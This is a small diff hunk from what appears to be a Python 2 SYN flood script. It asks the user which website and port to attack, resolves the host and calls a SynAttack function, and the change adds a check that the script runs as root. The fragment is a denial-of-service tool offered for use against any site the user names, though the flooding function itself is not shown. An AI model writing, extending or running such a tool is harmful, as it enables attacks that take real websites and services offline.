@@ -17,4 +17,6 @@ Target = raw_input("\n\n\t What is the Website Wished To Attack? http://")
 socket.gethostbyname(Target)					# Allows the intergretion of a DNS server, so users can insert websites
 DestinationPort = int(raw_input("\n\n\t What Port Would You Like To Attack Through? : ")) # Allows users to insert exactly what port attacks
 
+if not os.geteuid() == 0:
+	sys.exit('Must Be Root!')
 SynAttack(Source, Target, DestinationPort) # references and calls for the SynAttack function
